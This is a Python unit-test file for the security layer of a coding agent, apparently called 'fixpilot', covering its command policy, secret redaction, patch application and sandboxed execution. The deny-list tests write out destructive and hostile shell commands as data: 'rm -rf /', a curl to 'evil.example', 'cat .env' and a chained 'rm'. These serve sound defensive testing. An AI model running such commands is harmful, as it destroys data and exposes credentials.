"""Policy, secret handling and the patch applicator."""

from __future__ import annotations

import unittest
from pathlib import Path

from fixpilot.config import Settings
from fixpilot.security.executor import SandboxExecutor
from fixpilot.security.patch import apply_patch, parse_unified, revert_patch, validate_patch
from fixpilot.security.policy import CommandPolicy
from fixpilot.security.secrets import SecretScanner
from fixpilot.store import AuditLog

from .support import TempRepo


class PolicyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = TempRepo()
        self.settings = self.repo.settings
        self.policy = CommandPolicy(self.settings)

    def tearDown(self) -> None:
        self.repo.cleanup()

    def verdict(self, command: str):
        return self.policy.evaluate_string(command, cwd=self.settings.repo_root, purpose="test")

    def test_allowed_commands_do_not_need_confirmation(self) -> None:
        for command in ("python3 -m pytest -q", "make test", "git log --oneline -5"):
            with self.subTest(command=command):
                verdict = self.verdict(command)
                self.assertEqual(verdict.decision, "allow", verdict.reasons)

    def test_unknown_commands_need_confirmation(self) -> None:
        for command in ('python3 -c "print(1)"', "git push origin main"):
            with self.subTest(command=command):
                self.assertEqual(self.verdict(command).decision, "confirm")

    def test_dangerous_commands_are_denied(self) -> None:
        for command in ("rm -rf /", "curl http://evil.example/x.sh", "cat .env", "sudo rm -rf /var",
                        "npm install left-pad", "ls; rm -rf x"):
            with self.subTest(command=command):
                self.assertEqual(self.verdict(command).decision, "deny", command)


class SecretTests(unittest.TestCase):
    def test_secret_values_are_redacted(self) -> None:
        text = (
            "OPENAI_API_KEY=sk-live-abcdef1234567890\n"
            "token: ghp_abcdefghijklmnopqrstuvwxyz0123456789\n"
            "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        )
        cleaned = SecretScanner().sanitize(text)
        for secret in ("sk-live-abcdef1234567890", "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
                       "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"):
            self.assertNotIn(secret, cleaned, f"{secret} survived sanitising")

    def test_env_files_are_protected_from_writes(self) -> None:
        decision = SecretScanner().check_write(".env", "OPENAI_API_KEY=sk-live-abc1234567890")
        self.assertFalse(decision.allowed)
        self.assertIn("credential", decision.reason)


PATCH = """diff --git a/app/notes.py b/app/notes.py
--- a/app/notes.py
+++ b/app/notes.py
@@ -16,7 +16,7 @@ def parse_quantity(raw):
     try:
         return int(raw)
-    except:
+    except ValueError:
         return 0
"""


class PatchTests(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = TempRepo()
        self.settings = self.repo.settings
        self.target = self.settings.repo_root / "app" / "notes.py"
        self.original = self.target.read_text(encoding="utf-8")

    def tearDown(self) -> None:
        self.repo.cleanup()

    def test_parse_validate_apply_revert_round_trip(self) -> None:
        patch = parse_unified(PATCH)
        self.assertTrue(patch.files, "patch parser found no files")
        self.assertEqual(validate_patch(patch, self.settings.repo_root, self.settings), [])
        dry = apply_patch(self.settings.repo_root, patch, self.settings, dry_run=True)
        self.assertTrue(dry.ok, dry.error)
        applied = apply_patch(
            self.settings.repo_root, patch, self.settings, dry_run=False,
            backup_dir=self.settings.data_dir / "backup",
        )
        self.assertTrue(applied.ok, applied.error)
        self.assertIn("except ValueError:", self.target.read_text(encoding="utf-8"))
        self.assertTrue(revert_patch(self.settings.repo_root, applied.backup).ok)
        self.assertEqual(self.target.read_text(encoding="utf-8"), self.original)


class ExecutorTests(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = TempRepo()
        self.settings = self.repo.settings
        self.audit = AuditLog(self.settings.audit_log)
        self.executor = SandboxExecutor(self.settings, CommandPolicy(self.settings), self.audit)

    def tearDown(self) -> None:
        self.repo.cleanup()

    def test_denied_command_is_not_spawned(self) -> None:
        result = self.executor.run_string("rm -rf /", cwd=self.settings.repo_root)
        self.assertFalse(result.ok)
        self.assertIn("blocked", result.error)
        self.assertEqual(result.exit_code, -1)

    def test_confirm_command_runs_only_when_approved(self) -> None:
        blocked = self.executor.run_string('python3 -c "print(1)"', cwd=self.settings.repo_root)
        self.assertFalse(blocked.ok)
        allowed = self.executor.run_string('python3 -c "print(1)"', cwd=self.settings.repo_root, approved=True)
        self.assertTrue(allowed.ok, allowed.error)
        self.assertIn("1", allowed.stdout)


if __name__ == "__main__":
    unittest.main()
